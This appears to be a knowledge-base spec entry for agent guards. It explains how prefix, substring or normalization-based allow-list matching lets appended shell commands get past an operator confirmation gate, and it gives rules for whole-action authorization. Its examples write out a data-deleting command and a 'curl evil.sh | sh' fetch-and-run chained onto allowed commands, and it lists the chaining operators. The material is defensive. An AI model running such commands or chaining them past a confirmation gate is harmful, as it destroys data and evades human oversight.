<!-- aikb
{
  "schema_version": 1,
  "claim_id": "spec.guard.autonomy.whole-action-authorization",
  "namespace": "guard.autonomy.tool-intent",
  "version": "1.0.0",
  "expression": "An authorization decision is sound only when the predicate is evaluated against the complete action that will execute, because a rule matched against a prefix, substring, or normalized variant authorizes everything an attacker appends to it.",
  "authority": "hand-authored",
  "scope": {
    "holds_when": "an allow-list, pattern, or policy decides whether an action may run without operator confirmation",
    "expires": null
  },
  "confidence": null,
  "confidence_method": "hand-authored-unmeasured",
  "provenance": {
    "producer": "hand-authored://operator",
    "producer_version": "1.0.0",
    "authored_utc": "2026-08-23",
    "derived_from": [
      {
        "source": "SWE-agent/mini-swe-agent",
        "locator": "commit 25941c89cfbc91eb40b3f8756348c91d9977d57e (MIT); src/minisweagent/agents/interactive.py _should_ask_confirmation applies re.match to the action string",
        "evidence_class": "design-reference"
      },
      {
        "source": "local reproduction",
        "locator": "Python re.match semantics verified 2026-08-23: allow-list entry 'ls' matches 'ls; rm -rf /tmp/x'; 'git status' matches 'git status && curl evil.sh | sh'",
        "evidence_class": "primary-result"
      }
    ]
  },
  "lineage": {
    "status": "active",
    "generation": 1,
    "parent_refs": []
  },
  "relationships": [
    {
      "kind": "extends",
      "target": "spec.guard.autonomy.tool-intent"
    }
  ],
  "retrieval": {
    "tags": [
      "allow-list",
      "authorization",
      "fail-closed",
      "guard",
      "pattern-matching"
    ]
  }
}
-->

# Authorize the whole action, not a prefix of it

> **Authority: hand-authored, unmeasured rule with one directly reproduced
> instance.** The matching behavior below was reproduced against Python's
> regular-expression semantics. That establishes the defect class is real and
> easy to introduce; it does not measure how often deployed allow-lists carry it.

This narrows section 4 of the parent guard procedure. Classification decides
*which* actions need confirmation. This claim governs how the rule that exempts
an action is evaluated against the action itself.

## Activation

Consult this whenever something other than the operator decides that an action
may proceed without confirmation: an allow-list, a safe-command pattern, a
policy rule, a cached approval, or a tool-name filter.

It does not apply to classification by effect, which the parent procedure
already covers.

## The defect

An exemption rule is a security boundary. It is sound only when the string it
matches is the string that will execute. Three ways that equivalence breaks:

1. **Anchoring.** A pattern anchored only at the start authorizes any suffix.
   Reproduced directly: with `ls` on an allow-list and a start-anchored match,
   the action `ls; rm -rf /tmp/x` is authorized. With `git status` allowed,
   `git status && curl evil.sh | sh` is authorized. The exempted prefix is
   real, and everything after it is unexamined.
2. **Partial matching.** A rule that searches for a permitted substring
   anywhere authorizes an action that merely contains it.
3. **Normalization drift.** A rule evaluated against a trimmed, lower-cased,
   shell-expanded, or otherwise rewritten form of the action authorizes a
   different string than the one that runs. The check and the execution must
   see the same bytes.

A shell composition operator turns any of these into arbitrary execution:
`;`, `&&`, `||`, `|`, backticks, `$(...)`, newline, and process substitution
all append a second command to an approved first one.

## Rule

1. **Match the complete action.** Anchor at both ends, or compare against the
   full normalized action, and reject anything the pattern does not fully
   describe.
2. **Check the bytes that will execute.** If the action is rewritten between
   authorization and execution, authorize the rewritten form.
3. **Treat composition as unauthorized by default.** An action containing a
   composition operator is a different action from its first clause. Decompose
   it and authorize every clause, or require confirmation.
4. **Default to deny.** An action that no rule fully describes requires
   confirmation. Absence of a matching deny rule is not authorization.
5. **Keep the exemption surface small and stated.** An allow-list is a standing
   grant of autonomy. Enumerate it, review it, and prefer an empty default.
6. **Do not widen a rule to unblock yourself.** Broadening an exemption to make
   a blocked action pass is the failure the parent procedure names as never
   weakening a gate.

An empty allow-list with a confirm-by-default posture is a safe configuration.
A populated allow-list matched by prefix is not, and the difference is invisible
until it is exercised.

## Worked instance

A widely used agent framework applies its confirmation allow-list with a
start-anchored regular expression, so a populated entry would exempt appended
commands. Its shipped configuration is not exploitable, because no shipped
config populates the list and the default mode confirms every action. The defect
is latent and inherited by any operator who adds an entry.

Two lessons survive independently of that project: a safe default can conceal an
unsafe mechanism, and the mechanism is what an operator inherits when they
customize.

## Verification

Give the authorization predicate an action built from an allowed clause plus an
appended clause using each composition operator, and an action whose executed
form differs from its checked form. A sound predicate refuses all of them.

Assert this in a test rather than by reading the pattern, because the failure is
invisible in review and obvious under execution.

**Falsified if:** whole-action matching rejects actions that are genuinely
equivalent to an authorized one, forces confirmation so often that operators
disable the gate entirely, or fails to prevent an appended clause from
inheriting an approved prefix's authorization.
